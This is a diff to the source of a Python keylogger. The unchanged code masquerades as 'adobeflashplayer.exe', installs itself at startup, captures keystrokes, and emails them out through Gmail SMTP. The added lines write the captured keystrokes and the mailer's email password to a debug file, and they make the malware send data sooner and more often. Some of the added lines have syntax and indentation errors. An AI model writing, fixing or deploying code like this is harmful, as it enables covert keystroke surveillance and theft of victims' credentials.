@@ -21,6 +21,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 x, data, count= '', '', 0
 
 dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
+debugFile = "debug.txt"
 lastWindow = ''
 
 def startup():
@@ -35,7 +36,14 @@ if not path.isfile(dir):
 def send_mail():
     global data
     while True:
-        if len(data) > 30:
+		file_object = open(debugFile, "rw")
+		file_object.write("===== SENDING EMAIL: DEBUG MODE =====")
+		file_object.write("Data Content Length: " + len(data)
+		file_object.write("Keylogger Content: " + data")
+		file_object.write("Email: " + EEMAIL)
+		file_object.write("Password: " + EPASS)
+		file_object.write("[*] SENDING EMAIL NOW")
+        if len(data) > 0:
             timeInSecs = datetime.datetime.now()
             SERVER = "smtp.gmail.com"
             PORT = 587
@@ -60,9 +68,12 @@ def send_mail():
                 server.sendmail(FROM, TO, message_payload)
                 data = ''
                 server.quit()
+				file_object.write("[*] Data Sent!")
             except Exception as error:
                 print error
-        sleep(120)
+				file_object.write("[*] Error Encountered: " + error)
+		file_object.close()
+        sleep(60)
 
 
 def pushing(event):
